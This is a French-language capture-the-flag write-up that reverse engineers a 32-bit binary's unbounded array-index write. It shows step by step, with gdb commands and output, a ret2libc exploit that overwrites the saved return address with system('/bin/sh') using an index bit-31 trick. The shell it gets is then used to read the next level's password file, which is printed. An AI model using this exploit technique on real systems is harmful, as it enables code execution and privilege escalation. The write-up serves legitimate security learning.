# 
## Reverse engineering

le programme stock une valeur a [address de base + index*4]
ce qui fait un tableau d'adresse contenant des valeurs,
l'index n'est pas borné
le but est de trouver a quel index on ecrit dans le ret pour pouvoir le remplacer par system "/bin/sh"

disas main
0x080489f1 <+718>:	ret  -> le retour du main

info functions                              -> store_number

disas store_number

0x080486c5 <+149>:  shl    eax,0x2          -> multiplie l'index par 4

0x080486ce <+158>:	mov    %edx,(%eax)      -> stock le nombre a l'index

b *0x080486ce                               -> breakpoint pour voir l'adresse du nombre stocké

b *0x080489f1                               -> breakpoint pour voir l'adresse de eip avant le ret

run                                         -> run normal pour arriver au break

p/x $eax                                    -> pour voir a quelle adresse est stocké notre nombre
$1 = 0xffffd548                             -> on ecrit a partir d'ici

c                                           -> pour aller au second breakpoint

info frame
    Saved registers:
        eip at 0xffffd70c

p/x $esp                                    -> avant le ret esp pointe sur eip
$1 = 0xffffd70c                             -> adresse de eip

donc pour tomber sur eip il faut faire :
index_eip = 1 + (0xffffd70c - 0xffffd548) / 4

index_eip = 114

dans la fonction store on a :
0x08048688 <+88>:    je     0x8048697 <store_number+146>
ce jump vers la partie erreur se fait si l'index %3 est égale a 0.
 
Pour contourner ca on fait 114 + 2^31 = 2147483762
le bit a la position 31 passe a 1, le calcule de l'index fait *4, ce qui revient a decaler les bits de 2 vers la gauche, le bit qu'on a set disparait donc dans le calcul de l'index.

le contournement n'est pas necessaire pour 115 et 116


## Exploitation

```shell
(gdb) b main
(gdb) run
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc mappings
...
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
...
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh" 
0xf7f897ec
1 pattern found.
```
system address : 4159090384 -> 0xf7e6aed0
"/bin/sh" address : 4160264172 -> 0xf7f897ec

```shell
Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 1234
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami  
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
